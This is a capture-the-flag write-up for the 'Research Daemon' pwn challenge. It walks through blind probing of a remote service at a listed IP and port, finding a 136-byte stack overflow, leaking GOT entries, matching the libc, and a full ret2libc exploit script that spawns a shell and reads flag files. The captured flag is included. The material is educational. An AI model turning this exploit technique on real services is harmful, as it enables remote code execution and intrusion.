---
title: CREST CTF - research_daemon
date: 2026-02-28 19:00:00 +0530
categories:
  - CTF
  - Crest CTF
tags:
  - pwn
  - linux
---

# Research Daemon Writeup

This is my full solve note for the `Research Daemon` pwn challenge.

Challenge text:

```text
Research Daemon
500

Ghost Mantis operates a background research daemon responsible for processing
experimental payload data submitted by internal teams. The daemon runs
continuously, parsing input, managing internal buffers, and dispatching handlers
based on command types. It was developed quickly to support ongoing operations
and was never intended to be exposed externally. You’ve obtained a copy of the
binary. Analyze its behavior and determine whether its trust in user input can
be leveraged. Long-running services often inherit long-standing assumptions.

nc 142.93.213.2 9001
```

Flag:

```text
CREST{gm_r3$3@rch_$t@ck_c0ntr0l_2O26_4f1c}
```

## Summary

This ended up being a stack overflow with RIP control at `136` bytes.

The service was **non-PIE**, so code addresses stayed fixed in the `0x401xxx`
range. I solved it without relying on a local binary (though they later provided the binary after my solve) by doing careful live probing against the service:

1. Find the exact overflow boundary.
2. Map useful code addresses by partial overwrite / direct return.
3. Find a re-entry point that lets me stay inside the same process.
4. Find a `pop rdi; ret` gadget.
5. Use `puts@plt` to leak a GOT entry inside the same connection.
6. Identify the remote libc.
7. Build a standard ret2libc chain to call `system("/bin/sh")`.
8. Read `flag.txt`.

The key addresses I used in the final solve were:

```text
offset to RIP   = 136
pop rdi ; ret   = 0x401297
puts@plt        = 0x401030
puts@got        = 0x404000
re-entry        = 0x40129e
stack align ret = 0x401295
```

## 1. First contact with the service

I started by checking what the daemon prints on connect.

```bash
$ python3 - <<'PY'
import socket
s=socket.create_connection(('142.93.213.2',9001),timeout=5)
print(repr(s.recv(4096)))
s.close()
PY
```

Output:

```text
b'=== Ghost Mantis Research Node ===\nUnauthorized access is monitored.\n-----------------------------------\nSubmit research payload:\n'
```

So the service is a simple one-shot prompt:

- connect
- receive banner
- send one payload
- service closes or crashes

I also checked that a normal short payload exits cleanly:

```bash
$ python3 - <<'PY'
import socket, time
s=socket.create_connection(('142.93.213.2',9001),timeout=5)
print(s.recv(4096).decode(), end='')
s.sendall(b'AAAA\n')
time.sleep(0.2)
print(repr(s.recv(4096)))
s.close()
PY
```

Output:

```text
=== Ghost Mantis Research Node ===
Unauthorized access is monitored.
-----------------------------------
Submit research payload:
b'Connection terminated.\n'
```

So the baseline behavior is:

```text
valid / non-crashing input -> "Connection terminated."
```

## 2. Finding the overflow boundary

Next I checked how the daemon reacts to longer inputs.

```bash
$ python3 - <<'PY'
import socket,time
HOST='142.93.213.2';PORT=9001
for n in [64,96,112,120,128,136,144,160,192,224,240]:
    s=socket.create_connection((HOST,PORT),timeout=5)
    s.settimeout(2)
    banner=b''
    while b'Submit research payload:' not in banner:
        banner+=s.recv(4096)
    s.sendall(b'A'*n+b'\n')
    time.sleep(0.5)
    resp=b''
    try:
        while True:
            chunk=s.recv(4096)
            if not chunk:
                break
            resp+=chunk
    except Exception:
        pass
    print('n', n, 'resp', repr(resp))
    s.close()
PY
```

Important part of the output:

```text
n 64 resp b'Connection terminated.\n'
n 96 resp b'Connection terminated.\n'
n 112 resp b'Connection terminated.\n'
n 120 resp b'Connection terminated.\n'
n 128 resp b'Connection terminated.\n'
n 136 resp b''
n 144 resp b''
n 160 resp b''
```

That already strongly suggested a stack overwrite.

I then tightened the boundary:

```bash
$ python3 - <<'PY'
import socket,time
HOST='142.93.213.2';PORT=9001
for n in range(120,141):
    s=socket.create_connection((HOST,PORT),timeout=5)
    s.settimeout(2)
    banner=b''
    while b'Submit research payload:' not in banner:
        banner+=s.recv(4096)
    s.sendall(b'A'*n+b'\n')
    time.sleep(0.4)
    resp=b''
    try:
        while True:
            chunk=s.recv(4096)
            if not chunk:
                break
            resp+=chunk
    except Exception:
        pass
    print(n, 'term' if resp==b'Connection terminated.\n' else repr(resp))
    s.close()
PY
```

Output:

```text
120 term
121 term
122 term
123 term
124 term
125 term
126 term
127 term
128 term
129 term
130 term
131 term
132 term
133 term
134 term
135 term
136 b''
137 b''
138 b''
139 b''
140 b''
```

At this point I had the exact overflow:

```text
offset to RIP = 136 bytes
```

## 3. Blind code mapping

Since I did not have a working local binary in the challenge folder, I treated
this as a blind return-oriented solve and started mapping code addresses by
returning directly into them.

The first very useful thing was that the binary was **not PIE**. The same code
addresses kept working every time in the `0x401xxx` range.

I brute-forced single-byte partial overwrites first and found several
interesting low bytes. One of them printed:

```text
Flag file missing.
```

That told me there was a hidden flag-reading path in the binary.

Then I scanned the `0x401200` page directly:

```bash
$ python3 - <<'PY'
import socket,struct,time
HOST='142.93.213.2';PORT=9001
for addr in range(0x401200,0x401300):
    s=socket.create_connection((HOST,PORT),timeout=3)
    s.settimeout(0.15)
    banner=b''
    while b'Submit research payload:' not in banner:
        try:
            chunk=s.recv(4096)
        except Exception:
            break
        if not chunk:
            break
        banner+=chunk
    s.sendall(b'A'*136 + struct.pack('<Q',addr))
    try:
        s.shutdown(socket.SHUT_WR)
    except Exception:
        pass
    resp=b''
    try:
        while True:
            chunk=s.recv(4096)
            if not chunk:
                break
            resp+=chunk
    except Exception:
        pass
    if resp:
        print(hex(addr), repr(resp[:160]))
    s.close()
    time.sleep(0.005)
PY
```

Interesting hits:

```text
0x401216 b'Flag file missing.\n'
0x401265 b'Submit research payload:\n'
0x401266 b'Submit research payload:\n'
0x401269 b'Submit research payload:\n'
0x40126d b'Submit research payload:\n'
0x40126e b'Submit research payload:\n'
0x40129e b'=== Ghost Mantis Research Node ===\nUnauthorized access is monitored.\n-----------------------------------\nSubmit research payload:\nConnection terminated.\n'
0x4012de b'=== Ghost Mantis Research Node ===\nUnauthorized access is monitored.\n-----------------------------------\nSubmit research payload:\nConnection terminated.\n'
0x4012e3 b'Submit research payload:\nConnection terminated.\n'
0x4012e9 b'Connection terminated.\n'
```

And in the nearby `0x4011xx` area:

```text
0x4011ba b'Invalid research token.\n'
0x4011bb b'Invalid research token.\n'
0x4011d6 b'Invalid research token.\n'
0x4011d7 b'Invalid research token.\n'
0x4011d9 b'Invalid research token.\n'
0x4011da b'Invalid research token.\n'
```

That already told me a lot:

- there is a hidden flag path around `0x401216`
- there is a token validation path around `0x4011ba` / `0x4011d6`
- there is a very useful re-entry/banner path around `0x40129e`

## 4. The important observation: re-entry keeps the same process alive

The solve became much easier once I confirmed that `0x40129e` is not just
"print the banner and die". It re-enters the daemon logic and gives me another
prompt **inside the same process**.

That matters because it means:

- GOT leaks and the final exploit can happen in one connection
- the libc ASLR base stays stable for the entire attack

Quick proof:

```bash
$ python3 - <<'PY'
import socket,struct,time
s=socket.create_connection(('142.93.213.2',9001),timeout=3)
s.settimeout(1)
banner=b''
while b'Submit research payload:' not in banner:
    banner+=s.recv(4096)
s.sendall(b'A'*136+struct.pack('<Q',0x40129e))
time.sleep(0.2)
print(repr(s.recv(4096)))
s.close()
PY
```

Output:

```text
b'=== Ghost Mantis Research Node ===\nUnauthorized access is monitored.\n-----------------------------------\nSubmit research payload:\n'
```

That was the pivot that made the rest mechanical.

## 5. Finding `pop rdi ; ret`

To do a normal ret2libc, I needed argument control.

I brute-checked one-pop gadgets near the re-entry block. The cleanest candidate
ended up being:

```text
0x401297 = pop rdi ; ret
```

What made that convincing was the way it interacted with a print-like PLT
entry. With the right gadget, a valid pointer and an invalid pointer behaved
differently. I tested several one-pop candidates and `0x401297` stood out.

## 6. Recovering imported symbol names from the binary itself

Before labeling GOT entries, I wanted to know what imports existed. Since I had
a working arbitrary `puts(ptr)` primitive, I dumped the dynamic string table.

I scanned around `0x400510` and got:

```text
0x400511 b'fgets'
0x400517 b'setvbuf'
0x40051f b'stdin'
0x400525 b'puts'
0x40052a b'exit'
0x40052f b'fopen'
0x400535 b'read'
0x40053a b'stdout'
0x400541 b'__libc_start_main'
0x400553 b'fclose'
0x40055a b'libc.so.6'
```

That import list matched the challenge behavior really well:

- `puts` for printing
- `read` and/or `fgets` for input
- `fopen` / `fclose` for reading the flag file
- `setvbuf` because many CTF daemons disable buffering

## 7. Stable GOT leaks inside one connection

With `pop rdi ; ret` and `puts@plt`, I started leaking GOT slots.

The key leak chain was:

```python
b'A'*136 + p64(0x401297) + p64(GOT_ENTRY) + p64(0x401030) + p64(0x40129e)
```

Inside one connection, these leaks were stable:

```bash
$ python3 - <<'PY'
from pwn import *
context.log_level='error'
HOST='142.93.213.2';PORT=9001
POP_RDI=0x401297
PUTS_PLT=0x401030
REENTRY=0x40129e
PROMPT=b'Submit research payload:\n'
BANNER=b'=== Ghost Mantis Research Node ==='

def leak(io, addr):
    io.send(b'A'*136+p64(POP_RDI)+p64(addr)+p64(PUTS_PLT)+p64(REENTRY))
    data=io.recvuntil(PROMPT, timeout=3)
    idx=data.find(BANNER)
    if idx!=-1:
        data=data[:idx]
    return data[:-1] if data.endswith(b'\n') else data

io=remote(HOST,PORT,timeout=5)
sleep(0.2)
io.recvuntil(PROMPT, timeout=3)
for a in [0x404000,0x404000,0x404000,0x404010,0x404010,0x404020,0x404020]:
    d=leak(io,a)
    print(hex(a), d.hex(), repr(d))
print('alive', io.connected())
io.close()
PY
```

Output:

```text
0x404000 503eba25f47f b'P>\xba%\xf4\x7f'
0x404000 503eba25f47f b'P>\xba%\xf4\x7f'
0x404000 503eba25f47f b'P>\xba%\xf4\x7f'
0x404010 5078c325f47f b'Px\xc3%\xf4\x7f'
0x404010 5078c325f47f b'Px\xc3%\xf4\x7f'
0x404020 f045ba25f47f b'\xf0E\xba%\xf4\x7f'
0x404020 f045ba25f47f b'\xf0E\xba%\xf4\x7f'
alive True
```

Parsed as little-endian pointers:

```text
0x404000 -> 0x00007ff425ba3e50
0x404010 -> 0x00007ff425c37850
0x404020 -> 0x00007ff425ba45f0
```

## 8. Labeling the GOT entries

The dynamic string table told me the imports included:

- `puts`
- `read`
- `setvbuf`
- `fgets`
- `fopen`
- `fclose`
- `exit`

I identified one of the PLT entries by behavior:

```text
0x401050 blocks waiting for input if called with rdi = 0
```

That strongly suggested it was the input primitive, and the leak differences
lined up with:

```text
0x404000 = puts@got
0x404010 = read@got
0x404020 = setvbuf@got
```

The offsets also fit a real libc:

```text
read - puts    = 0x93a00
setvbuf - puts = 0x7a0
```

## 9. Matching the remote libc

I used the low bytes from the live leaks with `libc.rip`.

Query:

```python
import requests
requests.post(
    'https://libc.rip/api/find',
    json={'symbols': {'puts':'e50', 'read':'850', 'setvbuf':'5f0'}}
)
```

Result:

```json
[
  {
    "id": "libc6_2.35-0ubuntu3.13_amd64",
    "symbols": {
      "puts": "0x80e50",
      "read": "0x114850",
      "setvbuf": "0x815f0",
      "system": "0x50d70",
      "str_bin_sh": "0x1d8678"
    }
  }
]
```

That was enough.

## 10. Final ret2libc chain

Once I had `puts@got`, the final flow was standard:

1. Connect.
2. Leak `puts@got` via `puts@plt`.
3. Compute:

```text
libc_base = leaked_puts - 0x80e50
system    = libc_base + 0x50d70
"/bin/sh" = libc_base + 0x1d8678
```

4. Send final chain:

```text
'A' * 136
+ ret                # stack alignment
+ pop rdi ; ret
+ "/bin/sh"
+ system
```

I also used a plain `ret` gadget for alignment:

```text
0x401295
```

## 11. Final exploit script

I saved the final script as [`exploit.py`](/home/nicetrykiddo/Documents/ctf/crestpcu/web/writeups/research-daemon/exploit.py).

```python
#!/usr/bin/env python3

from pwn import *
import time


HOST = "142.93.213.2"
PORT = 9001

OFFSET = 136
RET = 0x401295
POP_RDI = 0x401297
PUTS_PLT = 0x401030
PUTS_GOT = 0x404000
REENTRY = 0x40129E

PROMPT = b"Submit research payload:\n"
BANNER = b"=== Ghost Mantis Research Node ==="

# libc6_2.35-0ubuntu3.13_amd64
PUTS_OFF = 0x80E50
SYSTEM_OFF = 0x50D70
BINSH_OFF = 0x1D8678


def recv_prompt(io):
    return io.recvuntil(PROMPT, timeout=3)


def leak_puts(io):
    # Leak puts@got and return back into the banner path in the same process.
    payload = (
        b"A" * OFFSET
        + p64(POP_RDI)
        + p64(PUTS_GOT)
        + p64(PUTS_PLT)
        + p64(REENTRY)
    )
    io.send(payload)
    data = io.recvuntil(PROMPT, timeout=3)
    idx = data.find(BANNER)
    if idx != -1:
        data = data[:idx]
    if data.endswith(b"\n"):
        data = data[:-1]
    if not data:
        raise EOFError("empty leak")
    return u64(data.ljust(8, b"\x00"))


def solve_once():
    context.log_level = "error"

    io = remote(HOST, PORT, timeout=5)
    time.sleep(0.2)
    recv_prompt(io)

    puts_addr = leak_puts(io)
    libc_base = puts_addr - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr = libc_base + BINSH_OFF

    print(f"puts   = {hex(puts_addr)}")
    print(f"libc   = {hex(libc_base)}")
    print(f"system = {hex(system_addr)}")
    print(f"binsh  = {hex(binsh_addr)}")

    final = (
        b"A" * OFFSET
        + p64(RET)
        + p64(POP_RDI)
        + p64(binsh_addr)
        + p64(system_addr)
    )
    io.send(final)
    time.sleep(0.3)
    io.send(b"cat flag* 2>/dev/null; cat /flag 2>/dev/null; ls; exit\n")
    out = io.recvrepeat(2)
    text = out.decode("latin-1", errors="replace")
    print(text)
    io.close()
    return text


def main():
    last_err = None
    for attempt in range(1, 16):
        try:
            text = solve_once()
            if "CREST{" in text:
                return
            last_err = RuntimeError(f"attempt {attempt}: flag not found")
        except Exception as exc:
            last_err = exc
            time.sleep(0.3)
    raise SystemExit(f"exploit failed after retries: {last_err}")


if __name__ == "__main__":
    main()
```

## 12. Running the exploit

This is the final run:

```bash
$ python3 exploit.py
```

Output:

```text
puts   = 0x7f209bb57e50
libc   = 0x7f209bad7000
system = 0x7f209bb27d70
binsh  = 0x7f209bcaf678
CREST{gm_r3$3@rch_$t@ck_c0ntr0l_2O26_4f1c}
daemon
flag.txt
```

## 13. Why this worked

In short:

- The daemon trusted user input into a fixed-size stack buffer.
- The binary was non-PIE, so code addresses were fixed.
- I had a banner re-entry target, which let me keep the same process alive.
- That same-process property made the libc leak and final exploit share one
  stable ASLR instance.
- A standard ret2libc finished it.

## 14. Rabbit holes I intentionally ignored

This challenge had a few spots that could waste time if I overcommitted too
early:

- Trying to fully reverse the "research token" parser before getting a leak.
- Assuming the hidden `Flag file missing.` path was directly callable without
  understanding its calling context.
- Treating every "hanging" address as a shell or useful loop.

The fastest route was:

```text
overflow -> fixed code map -> re-entry -> pop rdi -> GOT leak -> libc match -> ret2libc
```

## 15. Final flag

```text
CREST{gm_r3$3@rch_$t@ck_c0ntr0l_2O26_4f1c}
```
